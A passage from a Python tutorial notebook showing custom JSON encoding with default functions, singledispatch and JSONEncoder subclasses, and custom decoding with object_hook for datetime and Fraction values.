    if isinstance(arg, datetime):
        return arg.isoformat()
    elif isinstance(arg, set):
        return list(arg)
    elif isinstance(arg, Person):
        return arg.toJSON()
```

We can now serialize a more complex object:


```
log_record = dict(time=datetime.utcnow(),
                  message='Created new person record',
                  person=p)
```


```
json.dumps(log_record, default=custom_json_formatter)
```




    '{"time": "2018-12-29T22:26:45.769929", "message": "Created new person record", "person": {"name": "John", "age": 82, "create_dt": "2018-12-29T22:26:45.066252"}}'




```
print(json.dumps(log_record, default=custom_json_formatter, indent=2))
```

    {
      "time": "2018-12-29T22:26:45.769929",
      "message": "Created new person record",
      "person": {
        "name": "John",
        "age": 82,
        "create_dt": "2018-12-29T22:26:45.066252"
      }
    }
    

One thing to note here is that for the `Person` class we returned a formatted string for the `created_dt` attribute. We don't actually need to do this - we can simply return a `datetime` object and let `custom_json_formatter` handle serializing the `datetime` object:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        self.create_dt = datetime.utcnow()
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def toJSON(self):
        return {
            'name': self.name,
            'age': self.age,
            'create_dt': self.create_dt
        }
```


```
p = Person('Monty', 100)
```


```
log_record = dict(time=datetime.utcnow(),
                  message='Created new person record',
                  person=p)
```


```
print(json.dumps(log_record, default=custom_json_formatter, indent=2))
```

    {
      "time": "2018-12-29T22:26:47.029102",
      "message": "Created new person record",
      "person": {
        "name": "Monty",
        "age": 100,
        "create_dt": "2018-12-29T22:26:46.749022"
      }
    }
    

In fact, we could simplify our class further by simply returning a dict of the attributes, since in this case we want to serialize everything as is.
But using the `toJSON` callable means we can customize exactly how we want out objects to be serialized.

So, if we weren't particular about the serialization we could do this:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        self.create_dt = datetime.utcnow()
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def toJSON(self):
        return vars(self)
```


```
p = Person('Python', 27)
```


```
p.toJSON()
```




    {'name': 'Python',
     'age': 27,
     'create_dt': datetime.datetime(2018, 12, 29, 22, 26, 47, 973930)}




```
log_record['person'] = p
print(log_record)
```

    {'time': datetime.datetime(2018, 12, 29, 22, 26, 47, 29102), 'message': 'Created new person record', 'person': Person(name=Python, age=27)}
    


```
print(json.dumps(log_record, default=custom_json_formatter, indent=2))
```

    {
      "time": "2018-12-29T22:26:47.029102",
      "message": "Created new person record",
      "person": {
        "name": "Python",
        "age": 27,
        "create_dt": "2018-12-29T22:26:47.973930"
      }
    }
    

In fact, we could use this approach in our custom formatter - if an object does not have a `toJSON` callable, we'll just use a dictionary of the attributes - it it has any, it might not (like a complex number or a set as examples), so we need to watch out for that as well.


```
'toJSON' in vars(Person)
```




    True




```
def custom_json_formatter(arg):
    if isinstance(arg, datetime):
        return arg.isoformat()
    elif isinstance(arg, set):
        return list(arg)
    else:
        try:
            return arg.toJSON()
        except AttributeError:
            try:
                return vars(arg)
            except TypeError:
                return str(arg)
```

Let's create another custom class that does not have a `toJSON` method:


```
class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        
    def __repr__(self):
        return f'Point(x={self.x}, y={self.y})'
```


```
pt1 = Point(10, 10)
```


```
vars(pt1)
```




    {'x': 10, 'y': 10}




```
log_record = dict(time=datetime.utcnow(),
                  message='Created new point',
                  point=pt1,
                  created_by=p)
```


```
log_record
```




    {'time': datetime.datetime(2018, 12, 29, 22, 26, 50, 955039),
     'message': 'Created new point',
     'point': Point(x=10, y=10),
     'created_by': Person(name=Python, age=27)}



And we can now serialize it to JSON:


```
print(json.dumps(log_record, default=custom_json_formatter, indent=2))
```

    {
      "time": "2018-12-29T22:26:50.955039",
      "message": "Created new point",
      "point": {
        "x": 10,
        "y": 10
      },
      "created_by": {
        "name": "Python",
        "age": 27,
        "create_dt": "2018-12-29T22:26:47.973930"
      }
    }
    

So now, let's re-write our custom json formatter using the generic single dispatch decorator I mentioned earlier:


```
from functools import singledispatch
```

Our default approach is going to first try to use `toJSON`, if not it will try to use `vars`, and it that still fails we'll use the string representation, whatever that happens to be:


```
@singledispatch
def json_format(arg):
    print(arg)
    try:
        print('\ttrying to use toJSON...')
        return arg.toJSON()
    except AttributeError:
        print('\tfailed - trying to use vars...')
        try:
            return vars(arg)
        except TypeError:
            print('\tfailed - using string representation...')
            return str(arg)
```

And now we 'register' other data types:


```
@json_format.register(datetime)
def _(arg):
    return arg.isoformat()
```


```
@json_format.register(set)
def _(arg):
    return list(arg)
```

And we can now serialize just like before:


```
print(json.dumps(log_record, default=json_format, indent=2))
```

    Point(x=10, y=10)
    	trying to use toJSON...
    	failed - trying to use vars...
    Person(name=Python, age=27)
    	trying to use toJSON...
    {
      "time": "2018-12-29T22:26:50.955039",
      "message": "Created new point",
      "point": {
        "x": 10,
        "y": 10
      },
      "created_by": {
        "name": "Python",
        "age": 27,
        "create_dt": "2018-12-29T22:26:47.973930"
      }
    }
    

Let's change our Person class to emit some custom JSON instead of just using `vars`:


```
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        self.create_dt = datetime.utcnow()
        
    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'
    
    def toJSON(self):
        return dict(name=self.name)
```


```
p = Person('Python', 27)
```


```
log_record['created_by'] = p
```


```
print(json.dumps(log_record, default=json_format, indent=2))
```

    Point(x=10, y=10)
    	trying to use toJSON...
    	failed - trying to use vars...
    Person(name=Python, age=27)
    	trying to use toJSON...
    {
      "time": "2018-12-29T22:26:50.955039",
      "message": "Created new point",
      "point": {
        "x": 10,
        "y": 10
      },
      "created_by": {
        "name": "Python"
      }
    }
    

The way we wrote our default formatter, means that we can now also represent other unexpected data types, but using each object's string representation. If that's not acceptable, we can either not do this and let a `TypeError` exception get generated, or register more custom formatters:


```
from decimal import Decimal
from fractions import Fraction

json.dumps(dict(a=1+1j, 
                b=Decimal('0.5'), 
                c=Fraction(1, 3),
                p=Person('Python', 27),
                pt=Point(0,0),
                time=datetime.utcnow()
               ), 
           default=json_format)
```

    (1+1j)
    	trying to use toJSON...
    	failed - trying to use vars...
    	failed - using string representation...
    0.5
    	trying to use toJSON...
    	failed - trying to use vars...
    	failed - using string representation...
    1/3
    	trying to use toJSON...
    	failed - trying to use vars...
    	failed - using string representation...
    Person(name=Python, age=27)
    	trying to use toJSON...
    Point(x=0, y=0)
    	trying to use toJSON...
    	failed - trying to use vars...
    




    '{"a": "(1+1j)", "b": "0.5", "c": "1/3", "p": {"name": "Python"}, "pt": {"x": 0, "y": 0}, "time": "2018-12-29T22:26:54.860340"}'



Now, suppose we don't want that default representation for `Decimals` - we want to serialize it in this form: `Decimal(0.5)`.

All we need to do is to register a new function to serialize `Decimal` types:


```
@json_format.register(Decimal)
def _(arg):
    return f'Decimal({str(arg)})'
```


```
json.dumps(dict(a=1+1j, 
                b=Decimal(0.5), 
                c=Fraction(1, 3),
                p=Person('Python', 27),
                pt = Point(0,0),
                time = datetime.utcnow()
               ), 
           default=json_format)
```

    (1+1j)
    	trying to use toJSON...
    	failed - trying to use vars...
    	failed - using string representation...
    1/3
    	trying to use toJSON...
    	failed - trying to use vars...
    	failed - using string representation...
    Person(name=Python, age=27)
    	trying to use toJSON...
    Point(x=0, y=0)
    	trying to use toJSON...
    	failed - trying to use vars...
    




    '{"a": "(1+1j)", "b": "Decimal(0.5)", "c": "1/3", "p": {"name": "Python"}, "pt": {"x": 0, "y": 0}, "time": "2018-12-29T22:26:55.491606"}'



One last example that clearly shows the `json_format` function gets called recursively when needed:


```
print(json.dumps(dict(pt = Point(Person('Python', 27), 2+2j)),
          default=json_format, indent=2))
```

    Point(x=Person(name=Python, age=27), y=(2+2j))
    	trying to use toJSON...
    	failed - trying to use vars...
    Person(name=Python, age=27)
    	trying to use toJSON...
    (2+2j)
    	trying to use toJSON...
    	failed - trying to use vars...
    	failed - using string representation...
    {
      "pt": {
        "x": {
          "name": "Python"
        },
        "y": "(2+2j)"
      }
    }
    

##  Custom JSON Encoding using JSONEncoder

In the previous video, we saw how we were able to provide custom encodings using the `default` argument of the `dump`/`dumps` function.

But how does Python know how to encode the "standard" types, such as `str`, `int`, `float`, `list`, `dict`, etc?

It uses a special class - `JSONEncoder`.

This class supports the following encodings (see Python docs: https://docs.python.org/3/library/json.html#json.JSONEncoder)

|Python |JSON  |
|:----|:---|
| `dict` | object `{...}`|
| `list`, `tuple` | array `[...]` |
| `str`  | string `"..."`|
| `int`, `float` | number |
| `int` or `float` `Enums` | number |
| `bool` | `true` or `false` |
| `None` | `null` |

Anything beyond those Python types and we end up with a `TypeError` exception.

We can see how this class encodes objects by calling an instance of it directly:


```
import json

default_encoder = json.JSONEncoder()
default_encoder.encode([1, 2, 3])
```




    '[1, 2, 3]'



And for non-supported objects:


```
default_encoder.encode(1+1j)
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-2-faa062f02cec> in <module>
    ----> 1 default_encoder.encode(1+1j)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in encode(self, o)
        197         # exceptions aren't as detailed.  The list call should be roughly
        198         # equivalent to the PySequence_Fast that ''.join() would do.
    --> 199         chunks = self.iterencode(o, _one_shot=True)
        200         if not isinstance(chunks, (list, tuple)):
        201             chunks = list(chunks)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in iterencode(self, o, _one_shot)
        255                 self.key_separator, self.item_separator, self.sort_keys,
        256                 self.skipkeys, _one_shot)
    --> 257         return _iterencode(o, 0)
        258 
        259 def _make_iterencode(markers, _default, _encoder, _indent, _floatstr,
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in default(self, o)
        178         """
        179         raise TypeError("Object of type '%s' is not JSON serializable" %
    --> 180                         o.__class__.__name__)
        181 
        182     def encode(self, o):
    

    TypeError: Object of type 'complex' is not JSON serializable


We can actually extend this `JSONEncoder` class and override the `default` method. We can then add in support for whatever type we want to use, and pass any other types to the parent class to handle (either serialize the data or raise a `TypeError` exception). 

Let's just see a simple example first:


```
import json
from datetime import datetime

class CustomJSONEncoder(json.JSONEncoder):
    def default(self, arg):
        if isinstance(arg, datetime):
            return arg.isoformat()
        else:
            super().default(arg)
```


```
custom_encoder = CustomJSONEncoder()
```


```
custom_encoder.encode(True)
```




    'true'




```
custom_encoder.encode(datetime.utcnow())
```




    '"2018-12-29T22:27:19.863377"'



And we can now use this custom encoder by specifying it when we use `dump`/`dumps`:


```
json.dumps(dict(name='test', time=datetime.utcnow()), cls=CustomJSONEncoder)
```




    '{"name": "test", "time": "2018-12-29T22:27:20.135841"}'



One thing to note is that for both the `default` approach, and the `cls` approach, our method / encoder will only be used for types that Python cannot already serialize on its own (strings, integers, lists, etc).


```
def custom_encoder(arg):
    print('Custom encoder called...')
    if isinstance(arg, str):
        return f'some string: {arg}'
```

Here we want to "override" `dumps` default encoding behavior for strings:


```
json.dumps({'name': 'Python'}, default=custom_encoder)
```




    '{"name": "Python"}'



As you can see, we cannot do that - because the argument is a "recognized" type (`str`), Python does not even call our `custom_encoder` function.

And the same happens when we override the `default` method in our custom `JSONEncoder` class.

Let's look at the signature for `dumps`:


```
help(json.dumps)
```

    Help on function dumps in module json:
    
    dumps(obj, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw)
        Serialize ``obj`` to a JSON formatted ``str``.
        
        If ``skipkeys`` is true then ``dict`` keys that are not basic types
        (``str``, ``int``, ``float``, ``bool``, ``None``) will be skipped
        instead of raising a ``TypeError``.
        
        If ``ensure_ascii`` is false, then the return value can contain non-ASCII
        characters if they appear in strings contained in ``obj``. Otherwise, all
        such characters are escaped in JSON strings.
        
        If ``check_circular`` is false, then the circular reference check
        for container types will be skipped and a circular reference will
        result in an ``OverflowError`` (or worse).
        
        If ``allow_nan`` is false, then it will be a ``ValueError`` to
        serialize out of range ``float`` values (``nan``, ``inf``, ``-inf``) in
        strict compliance of the JSON specification, instead of using the
        JavaScript equivalents (``NaN``, ``Infinity``, ``-Infinity``).
        
        If ``indent`` is a non-negative integer, then JSON array elements and
        object members will be pretty-printed with that indent level. An indent
        level of 0 will only insert newlines. ``None`` is the most compact
        representation.
        
        If specified, ``separators`` should be an ``(item_separator, key_separator)``
        tuple.  The default is ``(', ', ': ')`` if *indent* is ``None`` and
        ``(',', ': ')`` otherwise.  To get the most compact JSON representation,
        you should specify ``(',', ':')`` to eliminate whitespace.
        
        ``default(obj)`` is a function that should return a serializable version
        of obj or raise TypeError. The default simply raises TypeError.
        
        If *sort_keys* is true (default: ``False``), then the output of
        dictionaries will be sorted by key.
        
        To use a custom ``JSONEncoder`` subclass (e.g. one that overrides the
        ``.default()`` method to serialize additional types), specify it with
        the ``cls`` kwarg; otherwise ``JSONEncoder`` is used.
    
    

And let's see the signature for `JSONEncoder`:


```
help(json.JSONEncoder)
```

    Help on class JSONEncoder in module json.encoder:
    
    class JSONEncoder(builtins.object)
     |  Extensible JSON <http://json.org> encoder for Python data structures.
     |  
     |  Supports the following objects and types by default:
     |  
     |  +-------------------+---------------+
     |  | Python            | JSON          |
     |  +===================+===============+
     |  | dict              | object        |
     |  +-------------------+---------------+
     |  | list, tuple       | array         |
     |  +-------------------+---------------+
     |  | str               | string        |
     |  +-------------------+---------------+
     |  | int, float        | number        |
     |  +-------------------+---------------+
     |  | True              | true          |
     |  +-------------------+---------------+
     |  | False             | false         |
     |  +-------------------+---------------+
     |  | None              | null          |
     |  +-------------------+---------------+
     |  
     |  To extend this to recognize other objects, subclass and implement a
     |  ``.default()`` method with another method that returns a serializable
     |  object for ``o`` if possible, otherwise it should call the superclass
     |  implementation (to raise ``TypeError``).
     |  
     |  Methods defined here:
     |  
     |  __init__(self, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, sort_keys=False, indent=None, separators=None, default=None)
     |      Constructor for JSONEncoder, with sensible defaults.
     |      
     |      If skipkeys is false, then it is a TypeError to attempt
     |      encoding of keys that are not str, int, float or None.  If
     |      skipkeys is True, such items are simply skipped.
     |      
     |      If ensure_ascii is true, the output is guaranteed to be str
     |      objects with all incoming non-ASCII characters escaped.  If
     |      ensure_ascii is false, the output can contain non-ASCII characters.
     |      
     |      If check_circular is true, then lists, dicts, and custom encoded
     |      objects will be checked for circular references during encoding to
     |      prevent an infinite recursion (which would cause an OverflowError).
     |      Otherwise, no such check takes place.
     |      
     |      If allow_nan is true, then NaN, Infinity, and -Infinity will be
     |      encoded as such.  This behavior is not JSON specification compliant,
     |      but is consistent with most JavaScript based encoders and decoders.
     |      Otherwise, it will be a ValueError to encode such floats.
     |      
     |      If sort_keys is true, then the output of dictionaries will be
     |      sorted by key; this is useful for regression tests to ensure
     |      that JSON serializations can be compared on a day-to-day basis.
     |      
     |      If indent is a non-negative integer, then JSON array
     |      elements and object members will be pretty-printed with that
     |      indent level.  An indent level of 0 will only insert newlines.
     |      None is the most compact representation.
     |      
     |      If specified, separators should be an (item_separator, key_separator)
     |      tuple.  The default is (', ', ': ') if *indent* is ``None`` and
     |      (',', ': ') otherwise.  To get the most compact JSON representation,
     |      you should specify (',', ':') to eliminate whitespace.
     |      
     |      If specified, default is a function that gets called for objects
     |      that can't otherwise be serialized.  It should return a JSON encodable
     |      version of the object or raise a ``TypeError``.
     |  
     |  default(self, o)
     |      Implement this method in a subclass such that it returns
     |      a serializable object for ``o``, or calls the base implementation
     |      (to raise a ``TypeError``).
     |      
     |      For example, to support arbitrary iterators, you could
     |      implement default like this::
     |      
     |          def default(self, o):
     |              try:
     |                  iterable = iter(o)
     |              except TypeError:
     |                  pass
     |              else:
     |                  return list(iterable)
     |              # Let the base class default method raise the TypeError
     |              return JSONEncoder.default(self, o)
     |  
     |  encode(self, o)
     |      Return a JSON string representation of a Python data structure.
     |      
     |      >>> from json.encoder import JSONEncoder
     |      >>> JSONEncoder().encode({"foo": ["bar", "baz"]})
     |      '{"foo": ["bar", "baz"]}'
     |  
     |  iterencode(self, o, _one_shot=False)
     |      Encode the given object and yield each string
     |      representation as available.
     |      
     |      For example::
     |      
     |          for chunk in JSONEncoder().iterencode(bigobject):
     |              mysocket.write(chunk)
     |  
     |  ----------------------------------------------------------------------
     |  Data descriptors defined here:
     |  
     |  __dict__
     |      dictionary for instance variables (if defined)
     |  
     |  __weakref__
     |      list of weak references to the object (if defined)
     |  
     |  ----------------------------------------------------------------------
     |  Data and other attributes defined here:
     |  
     |  item_separator = ', '
     |  
     |  key_separator = ': '
    
    

Here we are particularly interested in the `__init__` method signature:

 `__init__(self, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, sort_keys=False, indent=None, separators=None, default=None)`

`dumps(obj, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw)`
You'll notice that there are quite a few arguments for both, most of which are common to both.

With the `dump`/`dumps` method, there are quite a few things we can configure that control the json encoding - if we want to use those tweaks in a consistent manner throughout our app, we need to remember to use them consistently every time we call the `dump`/`dumps` function.

Consider this example:

```
d = {
    'a': float('inf'),
    'b': [1, 2, 3]
}
```


```
d
```




    {'a': inf, 'b': [1, 2, 3]}




```
type(d['a'])
```




    float



As you can see, that float is a special type of float - it represents + infinity.

Let's see if Python can encode that:


```
json.dumps(d)
```




    '{"a": Infinity, "b": [1, 2, 3]}'



Yes, it does - but notice the output, `Infinity`. Technically this is not JSON... (see https://tools.ietf.org/html/rfc4627 Section 2.4)

So, if we want to be strict about this, and ensure we are not trying to serialize a value such as infinity, we would do this instead:


```
json.dumps(d, allow_nan=False)
```


    ---------------------------------------------------------------------------

    ValueError                                Traceback (most recent call last)

    <ipython-input-16-a7057d91995f> in <module>
    ----> 1 json.dumps(d, allow_nan=False)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/__init__.py in dumps(obj, skipkeys, ensure_ascii, check_circular, allow_nan, cls, indent, separators, default, sort_keys, **kw)
        236         check_circular=check_circular, allow_nan=allow_nan, indent=indent,
        237         separators=separators, default=default, sort_keys=sort_keys,
    --> 238         **kw).encode(obj)
        239 
        240 
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in encode(self, o)
        197         # exceptions aren't as detailed.  The list call should be roughly
        198         # equivalent to the PySequence_Fast that ''.join() would do.
    --> 199         chunks = self.iterencode(o, _one_shot=True)
        200         if not isinstance(chunks, (list, tuple)):
        201             chunks = list(chunks)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in iterencode(self, o, _one_shot)
        255                 self.key_separator, self.item_separator, self.sort_keys,
        256                 self.skipkeys, _one_shot)
    --> 257         return _iterencode(o, 0)
        258 
        259 def _make_iterencode(markers, _default, _encoder, _indent, _floatstr,
    

    ValueError: Out of range float values are not JSON compliant


And we get the desired result.

What about trying to encode an invalid key (from JSON's perspective)::


```
d = {10: "int", 10.5: "float", 1+1j: "complex"}
```


```
d
```




    {10: 'int', 10.5: 'float', (1+1j): 'complex'}



These are all valid Python dictionary keys, but what happens with JSON encoding?


```
json.dumps(d)
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-19-1a41a0b88650> in <module>
    ----> 1 json.dumps(d)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/__init__.py in dumps(obj, skipkeys, ensure_ascii, check_circular, allow_nan, cls, indent, separators, default, sort_keys, **kw)
        229         cls is None and indent is None and separators is None and
        230         default is None and not sort_keys and not kw):
    --> 231         return _default_encoder.encode(obj)
        232     if cls is None:
        233         cls = JSONEncoder
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in encode(self, o)
        197         # exceptions aren't as detailed.  The list call should be roughly
        198         # equivalent to the PySequence_Fast that ''.join() would do.
    --> 199         chunks = self.iterencode(o, _one_shot=True)
        200         if not isinstance(chunks, (list, tuple)):
        201             chunks = list(chunks)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in iterencode(self, o, _one_shot)
        255                 self.key_separator, self.item_separator, self.sort_keys,
        256                 self.skipkeys, _one_shot)
    --> 257         return _iterencode(o, 0)
        258 
        259 def _make_iterencode(markers, _default, _encoder, _indent, _floatstr,
    

    TypeError: keys must be a string


As you can see we get an exception. We may want to simply ignore that exception and not include the offending key/value pair in our serialization:


```
json.dumps(d, skipkeys=True)
```




    '{"10": "int", "10.5": "float"}'



And now we no longer get an exception, and the complex key was simply skipped.

We can even change how the serialization is rendered (which of course means we may no longer have actual JSON):


```
d = {
    'name': 'Python',
    'age': 27,
    'created_by': 'Guido van Rossum',
    'list': [1, 2, 3]
}
```


```
json.dumps(d)
```




    '{"name": "Python", "age": 27, "created_by": "Guido van Rossum", "list": [1, 2, 3]}'




```
print(json.dumps(d, indent='---', separators=('', ' = ')))
```

    {
    ---"name" = "Python"
    ---"age" = 27
    ---"created_by" = "Guido van Rossum"
    ---"list" = [
    ------1
    ------2
    ------3
    ---]
    }
    

We can use this by the way, to create more compact JSON strings (uses less bytes):


```
print(json.dumps(d))
```

    {"name": "Python", "age": 27, "created_by": "Guido van Rossum", "list": [1, 2, 3]}
    

vs


```
print(json.dumps(d, separators=(',', ':')))
```

    {"name":"Python","age":27,"created_by":"Guido van Rossum","list":[1,2,3]}
    

As you can see, all the whitespace is eliminated. For transmitting large JSON objects, that can make a (relatively small) difference in making the JSON more compact.

So, if we want to consistently use the same values for all those tweaks, we have to consistently remember to set the arguments correctly in the `dump`/`dumps` functions.

Instead, we could create a custom JSONEncoder class that pre-sets all these things, and just use that encoder - simpler than remembering all those arguments and their correct values:


```
class CustomEncoder(json.JSONEncoder):
    def __init__(self, *args, **kwargs):
        super().__init__(skipkeys=True, 
                         allow_nan=False, 
                         indent='---', 
                         separators=('', ' = ')
                        )
        
    def default(self, arg):
        if isinstance(arg, datetime):
            return arg.isoformat()
        else:
            return super().default(arg)
```


```
d = {
    'time': datetime.utcnow(),
    1+1j: "complex",
    'name': 'Python'
}
```


```
print(json.dumps(d, cls=CustomEncoder))
```

    {
    ---"time" = "2018-12-29T22:27:26.689488"
    ---"name" = "Python"
    }
    

Another thing I want to point out is that with both these methods we are not limited in what we emit as our JSON serialization.

For example, for a `datetime` object, we may want to emit not only the ISO formatted date, but maybe some additional fields, all nested within a JSON object:


```
class CustomEncoder(json.JSONEncoder):
    def default(self, arg):
        if isinstance(arg, datetime):
            obj = dict(
                datatype="datetime",
                iso=arg.isoformat(),
                date=arg.date().isoformat(),
                time=arg.time().isoformat(),
                year=arg.year,
                month=arg.month,
                day=arg.day,
                hour=arg.hour,
                minutes=arg.minute,
                seconds=arg.second
            )
            return obj
        else:
            return super().default(arg)
```


```
d = {
    'time': datetime.utcnow(),
    'message': 'Testing...'
}
```


```
print(json.dumps(d, cls=CustomEncoder, indent=2))
```

    {
      "time": {
        "datatype": "datetime",
        "iso": "2018-12-29T22:27:27.668208",
        "date": "2018-12-29",
        "time": "22:27:27.668208",
        "year": 2018,
        "month": 12,
        "day": 29,
        "hour": 22,
        "minutes": 27,
        "seconds": 27
      },
      "message": "Testing..."
    }
    

##  Custom JSON Decoding

So far we have looked at how to encode (serialize) Python objects to JSON, using the standard as well as custom object serializers.

Now we need to turn our attention to teh reverse process - deserializing (decoding) JSON data.

Once again, the standard simple types such as strings, numbers (ints and floats), arrays, and objects with key/value pairs.
JSON does not differentiate between mutable and immutable lists - so everything that is an array (`[...]`) in JSON will get decoded into a list object.

Let's see a quick example of how to do this:


```
j = '''
    {
        "name": "Python",
        "age": 27,
        "versions": ["2.x", "3.x"]
    }
'''
```


```
import json
```


```
json.loads(j)
```




    {'name': 'Python', 'age': 27, 'versions': ['2.x', '3.x']}



But what about other data types, such as a date for example. How can we handle that?


```
p = '''
    {
        "time": "2018-10-21T09:14:00",
        "message": "created this json string"
    }
'''
```


```
json.loads(p)
```




    {'time': '2018-10-21T09:14:00', 'message': 'created this json string'}



The deserialization worked just fine, but you'll notice that the dictionary entry for `time` contains a string, not a date. 

This is not a trivial problem, and many 3rd party libraries have been written to deserialize specialized JSON structures into custom Python objects. It basically boils down to having a specific structure (schema) in the JSON and manually loading up some custom (or standard) Python object by specifically looking for certain elements and objects in the JSON object. Remember that JSON only supports a few basic types, so anything beyond that is really a custom **interpretation** of the data in the JSON object.

For example, suppose we have a JSON object where any object that contains the key/value pair `"objecttype": "datetime"` is guaranteed to contain another key called `"value"` containing a date time in the format %Y-%m-%dT%H:%M:%S. 
We could easily do the following:


```
p = '''
    {
        "time": {
            "objecttype": "datetime",
            "value": "2018-10-21T09:14:15"
            },
        "message": "created this json string"
    }
'''
```


```
d = json.loads(p)
```


```
d
```




    {'time': {'objecttype': 'datetime', 'value': '2018-10-21T09:14:15'},
     'message': 'created this json string'}



We could now run through our dictionary (top level only, we'll come back to that), and convert any datetime structures (schema) into actual datetime objects:


```
from datetime import datetime

for key, value in d.items():
    if (isinstance(value, dict) and 
        'objecttype' in value and 
        value['objecttype'] == 'datetime'):
        d[key] = datetime.strptime(value['value'], '%Y-%m-%dT%H:%M:%S')
```


```
d
```




    {'time': datetime.datetime(2018, 10, 21, 9, 14, 15),
     'message': 'created this json string'}



As you can see that worked just fine.
We can do this with other "custom" JSON schemas as well.

Let's say we have a JSON schema that will encode fractions using a `fraction` type indicator and associated keys `numerator` and `denominator` with integer values, such as:

```
"pieSlice": {
    "objecttype": "fraction",
    "numerator": 1,
    "denominator": 3
    }
```

We can deal with this in the same way as before:


```
j = '''
    {
        "cake": "yummy chocolate cake",
        "myShare": {
            "objecttype": "fraction",
            "numerator": 1,
            "denominator": 8
        }
    }
'''
```


```
d = json.loads(j)
```


```
d
```




    {'cake': 'yummy chocolate cake',
     'myShare': {'objecttype': 'fraction', 'numerator': 1, 'denominator': 8}}




```
from fractions import Fraction

for key, value in d.items():
    if (isinstance(value, dict) and
        'objecttype' in value and
        value['objecttype'] == 'fraction'):
        numerator = value['numerator']
        denominator = value['denominator']
        d[key] = Fraction(numerator, denominator)
```


```
d
```




    {'cake': 'yummy chocolate cake', 'myShare': Fraction(1, 8)}



We can extend this to even custom objects as long as they follow a specific structure (schema). We could put all this code into a function, even one that can handle multiple types and clean it up quite a bit.
But...

A few things:
1. It's a real pain having to go through the dictionary after the fact and convert the objects
2. Our conversion code only considered top-level objects - what if they are nested deeper in the JSON object - we would need to deal with that possibility.

There has to be a better way!
And indeed, there is - but all in all it's still relatively clunky in some respects.

Let's look at the `load`/`loads` functions first. They have an optional argument named `object_hook` that can reference a callable. This is very similar to the `default` argument we saw in the `dump`/`dumps` functions - but works for decoding instead of encoding. That callable, if specified, will be called for every value in the JSON object that is itself an object (including the root object). That dictionary will then be replaced by whatever that decoder returns.

Let's first write a dummy decoder, just to see how and when it gets called:

```
def custom_decoder(arg):
    print('decoding: ', arg)
    return arg
```


```
j = '''
    {
        "a": 1,
        "b": 2, 
        "c": {
            "c.1": 1,
            "c.2": 2,
            "c.3": {
                "c.3.1": 1,
                "c.3.2": 2
            }
        }
    }
'''
```


```
d = json.loads(j, object_hook=custom_decoder)
```

    decoding:  {'c.3.1': 1, 'c.3.2': 2}
    decoding:  {'c.1': 1, 'c.2': 2, 'c.3': {'c.3.1': 1, 'c.3.2': 2}}
    decoding:  {'a': 1, 'b': 2, 'c': {'c.1': 1, 'c.2': 2, 'c.3': {'c.3.1': 1, 'c.3.2': 2}}}
    

As you can see it called our decoder three times, the value for the key `c.3`, the value for the key `c` and the root object itself.

Now, let's write a decoder that will handle the datetime JSON we worked with earlier:


```
j = '''
    {
        "time": {
            "objecttype": "datetime",
            "value": "2018-10-21T09:14:15"
            },
        "message": "created this json string"
    }
'''
```


```
def custom_decoder(arg):
    if 'objecttype' in arg and arg['objecttype'] == 'datetime':
        return datetime.strptime(arg['value'], '%Y-%m-%dT%H:%M:%S')
    else:
        return arg  # important, otherwise we lose anything that's not a date!
```

Let's just see how it works as a plain function first:


```
custom_decoder(dict(objecttype='datetime', value='2018-10-21T09:14:15'))
```




    datetime.datetime(2018, 10, 21, 9, 14, 15)




```
custom_decoder((dict(a=1)))
```




    {'a': 1}




```
d = json.loads(j, object_hook=custom_decoder)
```


```
d
```




    {'time': datetime.datetime(2018, 10, 21, 9, 14, 15),
     'message': 'created this json string'}



The nice thing about this approach, is our code is simpler, and this works for nested items too:


```
j = '''
    {
        "times": {
            "created": {
                "objecttype": "datetime",
                "value": "2018-10-21T09:14:15"
                },
            "updated": {
                "objecttype": "datetime",
                "value": "2018-10-22T10:00:05"
                }
            },
        "message": "log message here..."
    }
'''
```


```
d = json.loads(j, object_hook=custom_decoder)
```


```
d
```




    {'times': {'created': datetime.datetime(2018, 10, 21, 9, 14, 15),
      'updated': datetime.datetime(2018, 10, 22, 10, 0, 5)},
     'message': 'log message here...'}



We can also extend this custom decoder to include other structures (schemas). Let's add in our fraction decoder:


```
def custom_decoder(arg):
    ret_value = arg
    if 'objecttype' in arg:
        if arg['objecttype'] == 'datetime':
            ret_value = datetime.strptime(arg['value'], '%Y-%m-%dT%H:%M:%S')
        elif arg['objecttype'] == 'fraction':
            ret_value = Fraction(arg['numerator'], arg['denominator'])
    return ret_value
```


```
j = '''
    {
        "cake": "yummy chocolate cake",
        "myShare": {
            "objecttype": "fraction",
            "numerator": 1,
            "denominator": 8
        },
        "eaten": {
            "at": {
                "objecttype": "datetime",
                "value": "2018-10-21T21:30:00"
                },
            "time_taken": "30 seconds"
        }
    }
'''
```


```
d = json.loads(j, object_hook=custom_decoder)
```


```
print(d)
```

    {'cake': 'yummy chocolate cake', 'myShare': Fraction(1, 8), 'eaten': {'at': datetime.datetime(2018, 10, 21, 21, 30), 'time_taken': '30 seconds'}}
    

We can't really use a generic single dispatch approach we took with the encoder though - the decoder always receives a dictionary, so we can't build it that way.

